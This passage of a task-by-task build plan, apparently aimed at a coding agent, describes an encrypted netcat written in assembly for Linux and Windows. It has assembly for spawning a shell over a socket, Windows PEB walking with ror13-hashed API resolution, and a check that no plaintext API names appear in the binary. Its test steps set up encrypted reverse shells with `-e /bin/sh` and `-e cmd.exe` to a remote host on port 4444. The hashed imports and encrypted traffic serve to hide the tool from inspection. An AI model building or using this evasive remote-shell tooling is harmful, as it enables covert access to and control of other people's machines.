    ; Close child's ends: stdin_pipe[0] (child reads), stdout_pipe[1] (child writes)
    mov eax, 3                  ; sys_close
    mov edi, [rsp]              ; stdin_pipe[0]
    syscall
    mov eax, 3
    mov edi, [rsp+12]           ; stdout_pipe[1]
    syscall

    ; Return: read_fd = stdout_pipe[0], write_fd = stdin_pipe[1]
    mov eax, [rsp+8]            ; stdout_pipe[0] - read child's output
    mov edx, [rsp+4]            ; stdin_pipe[1] - write to child's input
    add rsp, 32
    ret

.child:
    ; dup2(stdin_pipe[0], 0)    - child reads from stdin_pipe
    mov eax, 33
    mov edi, [rsp]              ; stdin_pipe[0]
    xor esi, esi                ; fd 0 = stdin
    syscall

    ; dup2(stdout_pipe[1], 1)   - child writes to stdout_pipe
    mov eax, 33
    mov edi, [rsp+12]           ; stdout_pipe[1]
    mov esi, 1                  ; fd 1 = stdout
    syscall

    ; dup2(stdout_pipe[1], 2)   - stderr also to stdout_pipe
    mov eax, 33
    mov edi, [rsp+12]
    mov esi, 2
    syscall

    ; Close all pipe fds in child (already duped)
    ; close stdin_pipe[0], stdin_pipe[1], stdout_pipe[0], stdout_pipe[1]
    mov eax, 3
    mov edi, [rsp]
    syscall
    mov eax, 3
    mov edi, [rsp+4]
    syscall
    mov eax, 3
    mov edi, [rsp+8]
    syscall
    mov eax, 3
    mov edi, [rsp+12]
    syscall

    ; execve(cmd, [cmd, NULL], NULL)
    ; Build argv on stack: [cmd_ptr, NULL]
    ; cmd pointer was saved before fork
    mov rdi, [g_exec]           ; command string
    sub rsp, 16
    mov [rsp], rdi              ; argv[0] = cmd
    xor rax, rax
    mov [rsp+8], rax            ; argv[1] = NULL
    mov rsi, rsp                ; argv
    xor rdx, rdx                ; envp = NULL
    mov eax, 59                 ; sys_execve
    syscall

    ; If execve returns, exit with error
    mov eax, 60
    mov edi, 1
    syscall
```

- [ ] **Step 4: Wire up .spawn_shell in linux/main.asm**

Replace the `.spawn_shell` placeholder:
```nasm
.spawn_shell:
    mov rdi, [g_exec]
    call spawn_shell
    cmp eax, -1
    je .exit_error
    ; eax = read_fd (child stdout), edx = write_fd (child stdin)
    ; relay_loop(socket_fd, local_read_fd, local_write_fd)
    mov esi, eax                ; local_read_fd = child stdout pipe
    ; edx already = local_write_fd = child stdin pipe
    mov edi, [g_sockfd]
    call relay_loop
    ; relay_loop jumps to cleanup_and_exit, never returns
```

Note: `relay_loop` needs adjustment to support separate read/write local fds (for shell mode, read from child stdout pipe, write to child stdin pipe). Add `g_shell_write_fd` to .bss and modify relay_loop to check it.

- [ ] **Step 5: Build and run shell test**

Run: `make linux && python3 tests/test_shell_linux.py`
Expected: PASS — shell command executed, output received encrypted

- [ ] **Step 6: Commit**

```bash
git add linux/shell.asm linux/main.asm tests/test_shell_linux.py
git commit -m "feat: Linux shell execution with fork/execve/dup2 pipe redirection"
```

---

### Task 10: Linux integration test — full encrypted session

**Files:**
- Create: `tests/test_integration_linux.py`

- [ ] **Step 1: Write comprehensive integration test**

Create `tests/test_integration_linux.py`:

Tests to run:
1. **Plaintext relay (no -e):** ncat listen ↔ Python connect, send/receive encrypted messages both directions
2. **Shell execution:** ncat listen -e /bin/sh ↔ Python connect, execute `whoami`, `ls`, `echo test`, verify output
3. **Connect mode:** Python listens, ncat connects, verify encrypted relay works
4. **Large message:** Send 60KB of data through the encrypted channel, verify integrity
5. **Connection drop:** Close Python side, verify ncat exits cleanly
6. **Wireshark-style verification:** Capture raw bytes on the wire, verify no plaintext substrings

Each test:
1. Generate random PSK
2. Start ncat in appropriate mode
3. Connect with Python using same PSK
4. Exchange encrypted messages using ChaCha20-Poly1305
5. Verify correctness
6. Cleanup

```bash
chmod +x tests/test_integration_linux.py
```

- [ ] **Step 2: Run integration tests**

Run: `python3 tests/test_integration_linux.py`
Expected: All tests PASS

- [ ] **Step 3: Fix any failures, re-run until green**

- [ ] **Step 4: Commit**

```bash
git add tests/test_integration_linux.py
git commit -m "test: comprehensive Linux integration tests for encrypted netcat"
```

---

## Chunk 3: Windows Implementation

### Task 11: Windows PEB walking and API resolution

**Files:**
- Create: `windows/peb.asm`
- Modify: `windows/main.asm` (replace stub)

**Reference:** Vapor's `find_kernel32`, `resolve_hash`, and API resolution code. Extend for ws2_32.dll and advapi32.dll.

- [ ] **Step 1: Implement windows/peb.asm**

Port from Vapor's PEB walking code. Provides:

```nasm
; find_module: walk PEB InMemoryOrderModuleList to find DLL by hash
; Input:  ecx = ror13 hash of DLL name (Unicode, case-insensitive)
; Output: rax = DLL base address (or 0 if not found)

; resolve_api: resolve function address from DLL export table
; Input:  rdi = DLL base address, ecx = ror13 hash of function name
; Output: rax = function address (or 0 if not found)

; resolve_all_apis: resolve all required APIs into api_table
; Finds kernel32.dll and ws2_32.dll via PEB walking
; Finds advapi32.dll via LoadLibraryA (which is resolved from kernel32 first)
; Stores all resolved function pointers in api_table (indexed by constants)
```

API table in .bss:
```nasm
section .bss
    api_table: resq 30         ; space for 30 function pointers

; API table indices (constants)
%define API_CreateProcessA      0
%define API_CreateThread        1
%define API_WaitForSingleObject 2
%define API_WaitForMultipleObjects 3
%define API_CreatePipe          4
%define API_ReadFile            5
%define API_WriteFile           6
%define API_CloseHandle         7
%define API_ExitProcess         8
%define API_GetCommandLineA     9
%define API_SetHandleInformation 10
%define API_TerminateProcess    11
%define API_LoadLibraryA        12
%define API_GetProcAddress      13
%define API_GetStdHandle        14
; ws2_32
%define API_WSAStartup          15
%define API_socket              16
%define API_bind                17
%define API_listen              18
%define API_accept              19
%define API_connect             20
%define API_send                21
%define API_recv                22
%define API_closesocket         23
; advapi32
%define API_SystemFunction036   24
```

Pre-compute ror13 hashes for each API name. Include hash values as constants:
```nasm
; Hashes (ror13 of ASCII function name)
%define HASH_CreateProcessA      0x16B3FE72
; ... etc, compute all hashes
```

- [ ] **Step 2: Update windows/main.asm entry point**

Replace stub with:
```nasm
section .text
global _start

_start:
    ; Align stack to 16 bytes (Windows x64 ABI)
    and rsp, -16
    sub rsp, 32                 ; shadow space

    ; Resolve all APIs
    call resolve_all_apis
    test rax, rax
    jz .exit_error

    ; APIs resolved — proceed to argument parsing
    ; (placeholder: ExitProcess(0))
    xor ecx, ecx
    call [api_table + API_ExitProcess * 8]
```

- [ ] **Step 3: Commit**

Note: Cannot easily test on Linux. Verify NASM assembles: `make windows` should produce `build/ncat.exe` without errors.

```bash
git add windows/peb.asm windows/main.asm
git commit -m "feat: Windows PEB walking and API resolution for kernel32/ws2_32/advapi32"
```

---

### Task 12: Windows CLI parsing (GetCommandLineA)

**Files:**
- Modify: `windows/main.asm`

- [ ] **Step 1: Implement argument parsing**

Add to `windows/main.asm` after API resolution:

```nasm
    ; Get command line string
    call [api_table + API_GetCommandLineA * 8]
    ; rax = pointer to command line string

    ; Parse: skip executable name (first token, may be quoted)
    ; Then walk remaining tokens for -l, -c, -p, -k, -e
    mov rsi, rax
    call parse_command_line
```

`parse_command_line` function:
1. Skip first token (executable path) — handle quoted paths
2. Loop through remaining whitespace-delimited tokens
3. Compare against `-l`, `-c`, `-p`, `-k`, `-e` (same flag logic as Linux)
4. Store parsed values in same .bss layout as Linux (g_mode, g_host, g_port, g_key, g_exec)
5. Validate required fields, write errors via WriteFile to stderr (GetStdHandle)

The same helper functions as Linux but adapted:
- `parse_ipv4`: identical algorithm, different register usage for Windows x64 ABI
- `parse_port`: identical
- `parse_hex`: identical

- [ ] **Step 2: Verify it assembles**

Run: `make windows`
Expected: `build/ncat.exe` produced without NASM errors

- [ ] **Step 3: Commit**

```bash
git add windows/main.asm
git commit -m "feat: Windows CLI parsing via GetCommandLineA"
```

---

### Task 13: Windows networking

**Files:**
- Create: `windows/net.asm`
- Modify: `windows/main.asm`

- [ ] **Step 1: Implement windows/net.asm**

Create `windows/net.asm`. Same interface as Linux but using ws2_32 API calls through `api_table`:

```nasm
; net_init: call WSAStartup
; Must be called before any socket operations
net_init:
    sub rsp, 408                ; WSADATA struct (408 bytes) + shadow space
    mov ecx, 0x0202             ; version 2.2
    lea rdx, [rsp+32]           ; pointer to WSADATA
    call [api_table + API_WSAStartup * 8]
    add rsp, 408
    ret

; net_listen: bind and accept on port
; Input:  cx = port (network byte order)
; Output: rax = connected socket handle (or -1)
net_listen:
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    mov ecx, 2                  ; AF_INET
    mov edx, 1                  ; SOCK_STREAM
    mov r8d, 6                  ; IPPROTO_TCP
    call [api_table + API_socket * 8]
    ; ... bind, listen, accept same flow as Linux but via API calls
    ; All calls go through api_table pointers
    ; Use Windows x64 calling convention: rcx, rdx, r8, r9, stack

; net_connect: connect to host:port
; Input:  ecx = host (network order), dx = port (network order)
; Output: rax = socket handle (or -1)

; send_all: send exactly n bytes via send()
; Input:  rcx = socket, rdx = buffer, r8 = length
; Output: rax = 0 success, -1 error

; recv_exact: receive exactly n bytes via recv()
; Input:  rcx = socket, rdx = buffer, r8 = length
; Output: rax = 0 success, -1 error
```

All functions follow Windows x64 ABI: args in rcx, rdx, r8, r9; caller provides 32 bytes shadow space; preserve rbx, rbp, rdi, rsi, r12-r15.

- [ ] **Step 2: Wire up networking in windows/main.asm**

After CLI parsing, add:
```nasm
    call net_init

    cmp byte [g_mode], 1
    je .listen_mode

.connect_mode:
    mov ecx, [g_host]
    mov dx, [g_port]
    call net_connect
    ; ...

.listen_mode:
    mov cx, [g_port]
    call net_listen
    ; ...

.connected:
    mov [g_sockfd], rax
    ; placeholder: ExitProcess(0) until relay loop is implemented
```

- [ ] **Step 3: Verify it assembles**

Run: `make windows`
Expected: No NASM errors

- [ ] **Step 4: Commit**

```bash
git add windows/net.asm windows/main.asm
git commit -m "feat: Windows networking via ws2_32 API table"
```

---

### Task 14: Windows crypto wrappers (RtlGenRandom nonce)

**Files:**
- Create: `windows/crypto.asm`

- [ ] **Step 1: Implement windows/crypto.asm**

Create `windows/crypto.asm`:

```nasm
; generate_nonce: fill buffer with 12 random bytes via SystemFunction036
; Input:  rcx = output buffer (12 bytes)
; Output: rax = 0 on success, -1 on error
generate_nonce:
    ; SystemFunction036(buffer, length)
    ; rcx = buffer (already set)
    mov edx, 12                 ; length
    call [api_table + API_SystemFunction036 * 8]
    ; Returns BOOLEAN (nonzero = success)
    test eax, eax
    jz .nonce_fail
    xor eax, eax
    ret
.nonce_fail:
    mov rax, -1
    ret

; encrypt_message / decrypt_message: same logic as Linux versions
; but using generate_nonce above for nonce generation
; Key from g_key, AEAD from shared macros
```

Wire protocol encrypt/decrypt wrappers — same interface as Linux `crypto.asm` but calling Windows `generate_nonce`.

- [ ] **Step 2: Verify it assembles**

Run: `make windows`
Expected: No NASM errors

- [ ] **Step 3: Commit**

```bash
git add windows/crypto.asm
git commit -m "feat: Windows crypto wrappers with RtlGenRandom nonce generation"
```

---

### Task 15: Windows threaded relay loop

**Files:**
- Create: `windows/io.asm`
- Modify: `windows/main.asm`

- [ ] **Step 1: Implement windows/io.asm**

Create `windows/io.asm`:

```nasm
; relay_start: launch two relay threads and wait for either to exit
; Input:  rcx = socket handle, rdx = local read handle, r8 = local write handle
; Does not return — calls ExitProcess when done

relay_start:
    ; Save handles to globals
    mov [g_sockfd], rcx
    mov [g_local_read], rdx
    mov [g_local_write], r8

    ; Create Thread 1: socket -> local (decrypt direction)
    xor ecx, ecx               ; lpThreadAttributes = NULL
    xor edx, edx               ; dwStackSize = 0 (default)
    lea r8, [rel thread_sock_to_local]  ; lpStartAddress
    xor r9, r9                  ; lpParameter = NULL
    push 0                      ; dwCreationFlags = 0
    push 0                      ; lpThreadId (don't care)
    sub rsp, 32                 ; shadow space
    call [api_table + API_CreateThread * 8]
    add rsp, 48
    mov [g_thread1], rax

    ; Create Thread 2: local -> socket (encrypt direction)
    ; Same pattern, entry point = thread_local_to_sock
    ; ...
    mov [g_thread2], rax

    ; WaitForMultipleObjects(2, handles, FALSE, INFINITE)
    mov ecx, 2
    lea rdx, [g_thread1]       ; array of 2 handles
    xor r8d, r8d               ; bWaitAll = FALSE
    mov r9d, 0xFFFFFFFF        ; INFINITE
    call [api_table + API_WaitForMultipleObjects * 8]

    ; Cleanup: close threads, socket, kill child if -e
    ; Close thread handles
    mov rcx, [g_thread1]
    call [api_table + API_CloseHandle * 8]
    mov rcx, [g_thread2]
    call [api_table + API_CloseHandle * 8]
    ; Close socket
    mov rcx, [g_sockfd]
    call [api_table + API_closesocket * 8]
    ; Kill child process if -e was used
    mov rcx, [g_child_process]
    test rcx, rcx
    jz .no_child_win
    mov edx, 1                  ; exit code
    call [api_table + API_TerminateProcess * 8]
.no_child_win:
    ; Zero the key in memory (spec requirement)
    lea rdi, [rel g_key]
    xor eax, eax
    mov ecx, 32
    rep stosb
    ; Exit
    xor ecx, ecx
    call [api_table + API_ExitProcess * 8]

; Thread 1: socket -> local (decrypt)
thread_sock_to_local:
    ; Windows x64: parameter in rcx (unused)
.loop:
    ; recv_exact(socket, length_header, 4)
    ; validate length
    ; recv_exact(socket, payload, length)
    ; decrypt_message
    ; if MAC fail: break
    ; WriteFile(local_write_handle, plaintext, pt_len, &written, NULL)
    jmp .loop
    xor eax, eax
    ret

; Thread 2: local -> socket (encrypt)
thread_local_to_sock:
.loop:
    ; ReadFile(local_read_handle, buffer, sizeof, &read, NULL)
    ; if read == 0: break (EOF)
    ; encrypt_message
    ; send_all(socket, wire_message, total_len)
    jmp .loop
    xor eax, eax
    ret
```

- [ ] **Step 2: Wire up relay in windows/main.asm**

After `.connected:`:
```nasm
.connected:
    mov [g_sockfd], rax

    cmp qword [g_exec], 0
    jne .spawn_shell

    ; No -e: relay between socket and stdin/stdout
    ; GetStdHandle(-10) = stdin, GetStdHandle(-11) = stdout
    mov ecx, -10                ; STD_INPUT_HANDLE
    call [api_table + API_GetStdHandle * 8]
    mov rbx, rax                ; stdin handle

    mov ecx, -11                ; STD_OUTPUT_HANDLE
    call [api_table + API_GetStdHandle * 8]
    mov r12, rax                ; stdout handle

    mov rcx, [g_sockfd]
    mov rdx, rbx                ; local_read = stdin
    mov r8, r12                 ; local_write = stdout
    call relay_start

.spawn_shell:
    ; handled in Task 16
```

Note: `GetStdHandle` is already in the API table at index 14 (`API_GetStdHandle`). Ensure it is resolved in `resolve_all_apis` alongside the other kernel32 APIs.

- [ ] **Step 3: Verify it assembles**

Run: `make windows`
Expected: No NASM errors

- [ ] **Step 4: Commit**

```bash
git add windows/io.asm windows/main.asm
git commit -m "feat: Windows threaded bidirectional encrypted relay loop"
```

---

### Task 16: Windows shell execution

**Files:**
- Create: `windows/shell.asm`
- Modify: `windows/main.asm`

- [ ] **Step 1: Implement windows/shell.asm**

Create `windows/shell.asm`:

```nasm
; spawn_shell: create process with redirected pipes
; Input:  rcx = pointer to command string
; Output: rax = stdout read handle, rdx = stdin write handle, r8 = process handle
;         rax = -1 on error

spawn_shell:
    ; SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE }  // bInheritHandle = TRUE
    ; CreatePipe(&stdin_read, &stdin_write, &sa, 0)
    ; CreatePipe(&stdout_read, &stdout_write, &sa, 0)
    ; SetHandleInformation(stdin_write, HANDLE_FLAG_INHERIT, 0)
    ; SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0)
    ;
    ; STARTUPINFOA si = { sizeof(si) }
    ; si.dwFlags = STARTF_USESTDHANDLES
    ; si.hStdInput = stdin_read
    ; si.hStdOutput = stdout_write
    ; si.hStdError = stdout_write
    ;
    ; CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
    ;
    ; CloseHandle(stdin_read)    // child's end
    ; CloseHandle(stdout_write)  // child's end
    ;
    ; Return: rax = stdout_read (parent reads child output)
    ;         rdx = stdin_write (parent writes to child input)
    ;         r8 = pi.hProcess (for TerminateProcess on cleanup)
```

Key struct sizes for stack layout:
- `SECURITY_ATTRIBUTES`: 24 bytes (nLength dword, pad, lpSecurityDescriptor qword, bInheritHandle dword, pad)
- `STARTUPINFOA`: 104 bytes (x64)
- `PROCESS_INFORMATION`: 24 bytes (hProcess, hThread, dwProcessId, dwThreadId)

- [ ] **Step 2: Wire up .spawn_shell in windows/main.asm**

```nasm
.spawn_shell:
    mov rcx, [g_exec]
    call spawn_shell
    cmp rax, -1
    je .exit_error
    ; rax = stdout_read, rdx = stdin_write, r8 = process handle
    mov [g_child_process], r8

    mov rcx, [g_sockfd]         ; socket
    ; rdx = stdin_write (local_read from relay perspective... wait)
    ; Actually: relay reads from stdout_read (child output) and writes to stdin_write (child input)
    ; So: local_read = stdout_read (rax), local_write = stdin_write (rdx)
    mov r8, rdx                 ; local_write = stdin_write
    mov rdx, rax                ; local_read = stdout_read
    mov rcx, [g_sockfd]
    call relay_start
```

- [ ] **Step 3: Verify it assembles**

Run: `make windows`
Expected: No NASM errors

- [ ] **Step 4: Commit**

```bash
git add windows/shell.asm windows/main.asm
git commit -m "feat: Windows shell execution with CreateProcessA and pipe redirection"
```

---

## Chunk 4: Cross-Platform Testing and Polish

### Task 17: Windows testing on a Windows machine

**Files:**
- Create: `tests/test_windows.py`

- [ ] **Step 1: Write Windows test script**

Create `tests/test_windows.py` — same structure as Linux integration tests but for Windows:
1. Encrypted relay (no -e): ncat.exe listen ↔ Python connect
2. Shell execution: ncat.exe -e cmd.exe ↔ Python send `echo hello`
3. Connect mode: Python listens, ncat.exe connects
4. Large message test

This test is designed to run ON a Windows machine with Python 3 installed. Copy `build/ncat.exe` and this script to Windows for testing.

- [ ] **Step 2: Test on Windows**

Copy `build/ncat.exe` and `tests/test_windows.py` to a Windows VM/machine.
Run: `python tests/test_windows.py`
Expected: All tests PASS

- [ ] **Step 3: Fix any Windows-specific issues, rebuild, retest**

- [ ] **Step 4: Commit**

```bash
git add tests/test_windows.py
git commit -m "test: Windows integration tests"
```

---

### Task 18: Cross-platform interoperability test

**Files:**
- Create: `tests/test_cross_platform.md`

- [ ] **Step 1: Document manual cross-platform test procedure**

Create `tests/test_cross_platform.md`:

```markdown
# Cross-Platform Interoperability Tests

## Setup
- Linux machine with build/ncat
- Windows machine with build/ncat.exe
- Same PSK on both: generate with `python3 -c "import secrets; print(secrets.token_hex(32))"`

## Test 1: Linux listener, Windows connector
1. Linux: `./ncat -l -p 4444 -k <key>`
2. Windows: `ncat.exe -c <linux-ip> -p 4444 -k <key>`
3. Type on either side, verify encrypted text appears on the other
4. Ctrl+C to close, verify clean exit on both

## Test 2: Windows listener, Linux connector
1. Windows: `ncat.exe -l -p 4444 -k <key>`
2. Linux: `./ncat -c <win-ip> -p 4444 -k <key>`
3. Same verification as Test 1

## Test 3: Encrypted reverse shell (Linux -> Windows)
1. Windows: `ncat.exe -l -p 4444 -k <key>`
2. Linux: `./ncat -c <win-ip> -p 4444 -k <key> -e /bin/sh`
3. On Windows, type: `whoami`, `ls`, `uname -a`
4. Verify output appears

## Test 4: Encrypted reverse shell (Windows -> Linux)
1. Linux: `./ncat -l -p 4444 -k <key>`
2. Windows: `ncat.exe -c <linux-ip> -p 4444 -k <key> -e cmd.exe`
3. On Linux, type: `whoami`, `dir`, `ipconfig`
4. Verify output appears

## Test 5: Wireshark verification
1. Start Wireshark capture on the network interface
2. Run any of the above tests
3. Filter by `tcp.port == 4444`
4. Verify: no plaintext commands or output visible in packet contents
5. Verify: all payload bytes appear random/encrypted
```

- [ ] **Step 2: Run cross-platform tests**

Execute each test manually between Linux and Windows machines.

- [ ] **Step 3: Fix any issues found, rebuild both platforms, retest**

- [ ] **Step 4: Commit**

```bash
git add tests/test_cross_platform.md
git commit -m "test: cross-platform interoperability test documentation"
```

---

### Task 19: Final polish — binary size check and cleanup

**Files:**
- Modify: `Makefile` (add size reporting)
- Modify: `build.sh` (final version)

- [ ] **Step 1: Build final binaries and check sizes**

Run: `make clean && make all`
Expected:
- `build/ncat`: < 10KB (target: 5-10KB)
- `build/ncat.exe`: < 20KB (target: 10-20KB)

If sizes exceed targets, investigate:
- Ensure `--strip-all` is applied
- Check for unnecessary .rodata strings
- Consider overlapping ELF/PE headers with code

- [ ] **Step 2: Verify no plaintext API strings in Windows binary**

Run: `strings build/ncat.exe | grep -i "create\|process\|socket\|kernel"`
Expected: No matches — all API resolution is via ror13 hashes

- [ ] **Step 3: Run all Linux tests one final time**

```bash
python3 tests/test_chacha20.py
python3 tests/test_poly1305.py
python3 tests/test_aead.py
python3 tests/test_integration_linux.py
```
Expected: All PASS

- [ ] **Step 4: Final commit**

```bash
git add -A
git commit -m "chore: final build system polish and binary size verification"
```

- [ ] **Step 5: Tag release**

```bash
git tag -a v1.0 -m "v1.0: Encrypted static netcat - ChaCha20-Poly1305, Linux + Windows x86-64"
```
